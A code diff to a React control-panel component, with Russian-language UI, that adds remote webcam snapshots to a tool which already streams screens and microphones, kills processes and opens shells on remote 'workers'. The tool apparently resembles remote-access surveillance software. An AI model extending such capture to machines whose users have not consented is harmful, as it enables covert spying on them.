@@ -1,6 +1,7 @@
 import { useEffect, useRef, useState } from 'react'
 import {
   fetchWorkerScreenshot, requestWorkerScreenshot,
+  fetchWorkerWebcam, requestWorkerWebcam,
   createScreenViewWs, createMicViewWs,
   fetchWorkerProcesses, killWorkerProcess,
   sendWorkerCommand, sendWorkerClick, createShellViewWs, createFilesViewWs,
@@ -76,8 +77,13 @@ function ScreenTab({ worker }) {
   const [waiting, setWaiting] = useState(false)
   const [notFound, setNotFound] = useState(false)
   const [live, setLive] = useState(false)
+  const [webcamUrl, setWebcamUrl] = useState(null)
+  const [webcamAt, setWebcamAt] = useState(null)
+  const [webcamWaiting, setWebcamWaiting] = useState(false)
   const prevUrlRef = useRef(null)
+  const prevWebcamUrlRef = useRef(null)
   const pollRef = useRef(null)
+  const webcamPollRef = useRef(null)
   const wsRef = useRef(null)
   const liveImgRef = useRef(null)
 
@@ -144,12 +150,42 @@ function ScreenTab({ worker }) {
     sendWorkerClick(worker.id, (e.clientX - rect.left) / rect.width, (e.clientY - rect.top) / rect.height).catch(() => {})
   }
 
+  const handleWebcam = async () => {
+    if (webcamWaiting) return
+    setWebcamWaiting(true)
+    try {
+      const tsBefore = webcamAt ? webcamAt.getTime() : 0
+      await requestWorkerWebcam(worker.id)
+      webcamPollRef.current = setInterval(async () => {
+        try {
+          const res = await fetchWorkerWebcam(worker.id)
+          const ts = res.headers['x-captured-at']
+          const tsNum = Number(ts) || 0
+          if (tsNum > tsBefore) {
+            if (prevWebcamUrlRef.current) URL.revokeObjectURL(prevWebcamUrlRef.current)
+            const url = URL.createObjectURL(res.data)
+            prevWebcamUrlRef.current = url
+            setWebcamUrl(url)
+            setWebcamAt(new Date(tsNum))
+            clearInterval(webcamPollRef.current)
+            setWebcamWaiting(false)
+          }
+        } catch {}
+      }, 2000)
+      setTimeout(() => {
+        if (webcamWaiting) { clearInterval(webcamPollRef.current); setWebcamWaiting(false) }
+      }, 20000)
+    } catch { setWebcamWaiting(false) }
+  }
+
   useEffect(() => {
     setLoading(true)
     loadShot().finally(() => setLoading(false))
     return () => {
       if (pollRef.current) clearInterval(pollRef.current)
+      if (webcamPollRef.current) clearInterval(webcamPollRef.current)
       if (prevUrlRef.current) URL.revokeObjectURL(prevUrlRef.current)
+      if (prevWebcamUrlRef.current) URL.revokeObjectURL(prevWebcamUrlRef.current)
       stopLive()
     }
   }, [])
@@ -177,6 +213,38 @@ function ScreenTab({ worker }) {
         {!notFound && !imgUrl && loading && <div className="text-slate-500 text-sm py-12">Загрузка...</div>}
         {imgUrl && !live && <img src={imgUrl} alt="screenshot" className="w-full h-auto block" />}
         <img ref={liveImgRef} alt="live" onClick={handleLiveClick} className={`w-full h-auto block ${live ? 'cursor-crosshair' : 'hidden'}`} />
+      </div>
+
+      {/* Webcam section */}
+      <div className="mt-4 pt-4 border-t border-white/10">
+        <div className="flex items-center justify-between mb-3">
+          <div className="flex items-center gap-2">
+            <span className="text-xs text-slate-400 font-medium">📷 Вебкамера</span>
+            {webcamAt && <span className="text-xs text-slate-600">{Math.floor((Date.now() - webcamAt.getTime()) / 1000)}с назад</span>}
+          </div>
+          <button
+            onClick={handleWebcam}
+            disabled={webcamWaiting}
+            className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white disabled:opacity-50 transition-colors"
+          >
+            {webcamWaiting ? 'Ждём...' : 'Снять фото'}
+          </button>
+        </div>
+        {webcamUrl && (
+          <div className="rounded-xl overflow-hidden bg-black">
+            <img src={webcamUrl} alt="webcam" className="w-full h-auto block" />
+          </div>
+        )}
+        {!webcamUrl && !webcamWaiting && (
+          <div className="rounded-xl bg-black/30 border border-white/5 flex items-center justify-center py-8 text-slate-600 text-sm">
+            Нет снимков
+          </div>
+        )}
+        {webcamWaiting && !webcamUrl && (
+          <div className="rounded-xl bg-black/30 border border-white/5 flex items-center justify-center py-8 text-slate-500 text-sm">
+            Ожидаем ответа от воркера...
+          </div>
+        )}
       </div>
     </div>
   )
